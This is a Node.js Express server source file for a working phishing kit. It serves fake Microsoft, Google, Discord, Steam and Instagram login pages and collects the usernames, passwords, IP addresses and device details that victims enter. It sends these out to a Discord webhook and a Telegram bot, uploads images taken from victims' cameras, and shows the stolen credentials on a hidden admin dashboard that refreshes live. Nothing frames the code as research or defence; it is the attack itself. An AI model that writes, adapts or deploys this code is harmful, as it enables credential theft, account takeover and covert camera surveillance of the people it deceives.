require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const app = express();

app.use(express.json({ limit: '15mb' }));
app.use(cookieParser());

const LOG = path.join('/tmp', 'captures.log');
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(16).toString('hex');
const ADMIN_USER = process.env.ADMIN_USER || 'null_admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'changeme_0xDEAD';
const ADMIN_KEY  = process.env.ADMIN_KEY  || crypto.randomBytes(8).toString('hex');
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const TELEGRAM_TOKEN  = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT   = process.env.TELEGRAM_CHAT;

// ---- device detection ----
function parseDevice(ua) {
  if (!ua) return 'Unknown';
  const lower = ua.toLowerCase();
  let os = 'Unknown OS';
  if (lower.includes('iphone')) os = 'iPhone (iOS)';
  else if (lower.includes('ipad')) os = 'iPad (iOS)';
  else if (lower.includes('android')) os = 'Android';
  else if (lower.includes('windows')) os = 'Windows';
  else if (lower.includes('mac os')) os = 'macOS';
  else if (lower.includes('linux')) os = 'Linux';

  let browser = 'Unknown Browser';
  if (lower.includes('edg/')) browser = 'Edge';
  else if (lower.includes('chrome')) browser = 'Chrome';
  else if (lower.includes('firefox')) browser = 'Firefox';
  else if (lower.includes('safari') && !lower.includes('chrome')) browser = 'Safari';

  return `${os} · ${browser}`;
}

// ---- discord: text capture ----
function pushDiscord(data) {
  if (!DISCORD_WEBHOOK) return;
  fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: 'rack-watch',
      embeds: [{
        title: `🎣 ${(data.brand || 'generic').toUpperCase()} capture`,
        color: 0xe26a6a,
        fields: [
          { name: 'user',   value: '```' + (data.user || '(empty)') + '```', inline: true },
          { name: 'pass',   value: '```' + (data.pass || '(empty)') + '```', inline: true },
          { name: 'ip',     value: '`' + (data.ip || 'n/a') + '`', inline: false },
          { name: 'device', value: '`' + parseDevice(data.ua) + '`', inline: true },
          { name: 'raw UA', value: '`' + (data.ua || 'n/a').slice(0, 120) + '`', inline: false }
        ],
        timestamp: new Date(data.ts).toISOString()
      }]
    })
  }).catch(() => {});
}

// ---- discord: camera files ----
async function pushCamFiles({ front, back, brand, ip }) {
  if (!DISCORD_WEBHOOK) return;
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify({
    content: `📸 **Camera capture** — ${brand || 'unknown'} — \`${ip || ''}\``
  }));
  if (front && front.includes(',')) {
    const b = Buffer.from(front.split(',')[1], 'base64');
    fd.append('file1', new Blob([b], { type: 'image/jpeg' }), 'front.jpg');
  }
  if (back && back.includes(',')) {
    const b = Buffer.from(back.split(',')[1], 'base64');
    fd.append('file2', new Blob([b], { type: 'image/jpeg' }), 'back.jpg');
  }
  await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
}

// ---- telegram fallback ----
function pushTelegram(data) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT) return;
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT,
      text: `🎣 ${data.brand || 'generic'}\nIP: ${data.ip}\nDevice: ${parseDevice(data.ua)}\nuser: ${data.user}\npass: ${data.pass}`
    })
  }).catch(() => {});
}

function logCapture(data) {
  try { fs.appendFileSync(LOG, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`); } catch (_) {}
  pushDiscord(data);
  pushTelegram(data);
}

function isAdmin(req) {
  return req.cookies && req.cookies.rack_session === SESSION_SECRET;
}

// ---- router (must come BEFORE static) ----
app.get('/', (req, res) => {
  const brand = (req.query.b || '').toLowerCase();
  const valid = ['microsoft', 'google', 'discord', 'steam', 'instagram', 'generic'];
  if (valid.includes(brand)) {
    return res.sendFile(path.join(__dirname, 'public', `${brand}.html`));
  }
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ---- static files ----
app.use(express.static('public'));

// ---- capture credentials ----
app.post('/capture', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const user = (req.body.user || '').slice(0, 200);
  const pass = (req.body.pass || '').slice(0, 200);
  const brand = (req.body.brand || 'generic').slice(0, 20);

  if (user === ADMIN_USER && pass === ADMIN_PASS) {
    res.cookie('rack_session', SESSION_SECRET, {
      httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 * 30
    });
    return res.json({ ok: true, redirect: '/admin' });
  }

  logCapture({
    ip,
    ua: req.headers['user-agent'] || '',
    user,
    pass,
    brand,
    ts: Date.now()
  });
  res.json({ ok: true });
});

// ---- camera uploads ----
app.post('/upload-cam', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const { front, back, brand } = req.body || {};
  await pushCamFiles({ front, back, brand, ip });
  res.json({ ok: true });
});

// ---- admin dashboard ----
app.get('/admin', (req, res) => {
  if (!isAdmin(req)) return res.status(403).send('nope');

  const adminHtml = `<!doctype html><html><head><meta charset="utf-8"><title>rack · live</title>
<style>
  body{margin:0;background:#0f1115;color:#e6e6e6;font-family:monospace;padding:20px}
  h1{font-size:16px;color:#4a90e2;margin:0 0 16px}
  table{border-collapse:collapse;width:100%;font-size:13px}
  th,td{border-bottom:1px solid #2a2f3a;padding:8px 10px;text-align:left;vertical-align:top}
  th{color:#8a8f99;font-weight:600}
  td.user{color:#7dd87d} td.pass{color:#e26a6a} td.brand{color:#4a90e2}
  .empty{color:#8a8f99;padding:20px 0}
</style></head><body>
<h1>🎣 live captures</h1>
<div id="wrap">loading…</div>
<script>
async function tick(){
  const r = await fetch('/admin/logs?key=${ADMIN_KEY}');
  const t = await r.text();
  const rows = t.trim().split('\\n').filter(Boolean).map(l=>{
    try{
      const m = l.match(/\\[([^\\]]+)\\] (\\{.*\\})/);
      const d = JSON.parse(m[2]);
      const dev = (d.ua||'').slice(0,60);
      return '<tr><td>'+new Date(d.ts).toLocaleTimeString()+'</td><td class="brand">'+(d.brand||'gen')+'</td><td class="user">'+(d.user||'')+'</td><td class="pass">'+(d.pass||'')+'</td><td>'+(d.ip||'')+'</td><td style="color:#8a8f99">'+dev+'</td></tr>';
    }catch(e){return ''}
  }).reverse().join('');
  document.getElementById('wrap').innerHTML = rows
    ? '<table><tr><th>time</th><th>brand</th><th>user</th><th>pass</th><th>ip</th><th>ua</th></tr>'+rows+'</table>'
    : '<div class="empty">no captures yet — waiting</div>';
}
tick(); setInterval(tick, 3000);
</script></body></html>`;
  res.send(adminHtml);
});

app.get('/admin/logs', (req, res) => {
  if (!isAdmin(req) && req.query.key !== ADMIN_KEY) return res.status(403).send('nope');
  res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('rack-warm on :' + PORT));